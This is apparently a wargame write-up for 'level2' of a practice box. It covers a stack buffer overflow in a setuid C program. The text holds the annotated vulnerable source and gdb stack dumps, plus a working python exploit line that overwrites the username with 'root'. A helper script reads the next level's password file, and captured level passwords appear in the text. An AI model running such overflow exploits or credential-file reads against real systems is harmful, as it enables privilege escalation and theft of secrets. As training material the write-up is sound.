@@ -1,0 +1,125 @@
+
+password for level2: TJyK9lJwZrgqc8nIIF6o
+
+
+start with source code:
+
+level2@rzt-bin01:/levels$ cat level2.c
+// Created by Hidden (hidden@undernet.org)
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+struct USER {
+    int id;
+    char name[32];
+    char pass[32];
+} u = { 0, "nobody", "Ksdkjkk32avsh" };
+
+int main(int argc, char **argv)
+{
+    char user[32];
+    char pass[32];
+    char command[64];                         <---- buffer is only 64 bytes, but fgets allows up to 128
+    char *shell[] = { command, 0 };
+    char *p;
+
+    printf("Username: ");
+    fgets(user, 31, stdin);
+    p = strchr(user, '\n');
+    if (p)
+        *p = '\0';
+    if (strcmp(user, u.name))
+        return 0;
+    printf("Password: ");
+    fgets(pass, 31, stdin);
+    p = strchr(pass, '\n');
+    if (p)
+        *p = '\0';
+    if (strcmp(pass, u.pass))
+        return 0;
+    printf("Command: ");
+    if (fgets(command, 128, stdin) == NULL)    <---- fgets allows more than command buffer, let's do the overflow here
+        return 0;
+    p = strchr(command, '\n');
+    if (p)
+        *p = '\0';
+    if (!strcmp(user, "root")) {
+        printf("Good job!\n");
+        printf("command: %s\n", command);
+        setresuid(geteuid(), geteuid(), geteuid());
+        execve(shell[0],shell,0);
+    }
+    else {
+        printf("Okay Mr. %s. Dropping priviledges though.\n", user);
+        setreuid(getuid(), getuid());
+        execve(shell[0],shell,0);
+    }
+    return 0;
+}
+
+
+Note:
+(gdb) p &command
+$4 = (char (*)[64]) 0xbffff70c
+(gdb) p &pass
+$5 = (char (*)[32]) 0xbffff74c
+(gdb) p &user
+$6 = (char (*)[32]) 0xbffff76c   <--- need to overwrite this
+
+
+level2@rzt-bin01:$ gdb /levels/level2
+GNU gdb (GDB) 7.4.1-debian
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>...
+Reading symbols from /levels/level2...done.
+(gdb) b *main+315
+Breakpoint 1 at 0x8048757: file level2.c, line 39.
+(gdb) r
+Starting program: /levels/level2 
+Username: nobody
+Password: Ksdkjkk32avsh
+Command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAroot
+
+Breakpoint 1, 0x08048757 in main (argc=1, argv=0xbffff844) at level2.c:39
+warning: Source file is more recent than executable.
+39      if (fgets(command, 128, stdin) == NULL)
+(gdb) x 100x $esp
+Invalid number "100x".
+(gdb) x /100x $esp
+0xbffff6f0: 0xbffff70c  0x00000080  0xb7fd6420  0xbffff7f0
+0xbffff700: 0xb7fffac0  0xbffff70c  0x00000000  0x41414141
+0xbffff710: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff720: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff730: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff740: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff750: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff760: 0x41414141  0x41414141  0x41414141  0x746f6f72   <-- YAY username "root" (0x726f6f74) has been overwritten here
+0xbffff770: 0x0000000a  0xbffff844  0xbffff84c  0xbffff798
+0xbffff780: 0xb7eb72b5  0xb7ff0560  0x0804886b  0xbffff759
+0xbffff790: 0xb7fd5ff4  0x00000000  0xbffff818  0xb7e9ee16
+0xbffff7a0: 0x00000001  0xbffff844  0xbffff84c  0xb7fe0858
+0xbffff7b0: 0xb7ff67f1  0xffffffff  0xb7ffeff4  0x08048368
+0xbffff7c0: 0x00000001  0xbffff800  0xb7fefbe6  0xb7fffac0
+
+
+The only way to get the \x00 sent is to sent it via a python command line script:
+
+level2@rzt-bin01:/levels$ python -c "print 'nobody\nKsdkjkk32avsh\n' + '/tmp/script.sh\x00' + 'A'* 81 + 'root\x00'" | ./level2
+Username: Password: Command: Good job!
+b130hOOfGftXUfmRZlgD
+
+
+code for script /tmp/script.sh:
+
+#!/bin/bash              <---- IMPORTANT, if you just put the command in without the she-bang, the script won't run!
+
+cat /home/level3/.pass
